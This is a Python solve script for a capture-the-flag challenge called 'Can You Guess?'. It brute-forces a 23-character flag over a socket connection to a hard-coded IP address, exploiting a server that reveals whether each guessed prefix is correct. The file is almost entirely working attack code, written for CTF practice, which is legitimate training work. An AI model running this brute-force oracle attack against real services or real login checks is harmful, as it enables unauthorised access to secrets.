#!/usr/bin/env python3
"""
Solve script for "Can You Guess?" CTF challenge

The challenge has a character-by-character comparison vulnerability.
We can brute force each character by checking if we get "Correct flag!"
(character matched) vs "Wrong flag!" (character didn't match).
"""

import socket
import string

# Connection details
HOST = "13.53.139.173"
PORT = 5007

# Character set: uppercase, lowercase, numbers, and special symbols _, ?, !
CHARSET = string.ascii_letters + string.digits + "_?!"

FLAG_LENGTH = 23

def try_guess(guess):
    """Send a guess to the server and check if it's correct so far."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((HOST, PORT))

        # Receive the intro text
        data = b""
        while b"This is truly too hard for you..." not in data:
            data += sock.recv(4096)

        # Send our guess
        sock.sendall(guess.encode() + b"\n")

        # Get response
        response = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass

        sock.close()
        return "Correct flag!" in response.decode()
    except Exception as e:
        print(f"Error: {e}")
        return None

def main():
    flag = ""

    print(f"[*] Starting brute force attack...")
    print(f"[*] Flag length: {FLAG_LENGTH}")
    print(f"[*] Character set: {CHARSET}")
    print()

    for position in range(FLAG_LENGTH):
        print(f"[*] Brute forcing position {position + 1}/{FLAG_LENGTH}...")
        found = False

        for char in CHARSET:
            test = flag + char
            result = try_guess(test)

            if result is True:
                flag += char
                print(f"[+] Found character: '{char}' -> Current flag: {flag}")
                found = True
                break
            elif result is None:
                # Connection error, retry
                print(f"[!] Connection error, retrying '{char}'...")
                result = try_guess(test)
                if result is True:
                    flag += char
                    print(f"[+] Found character: '{char}' -> Current flag: {flag}")
                    found = True
                    break

        if not found:
            print(f"[-] Could not find character at position {position + 1}")
            print(f"[-] Current flag so far: {flag}")
            break

    print()
    print(f"[+] Final flag content: {flag}")
    print(f"[+] Full flag: flag{{{flag}}}")

    return flag

if __name__ == "__main__":
    main()
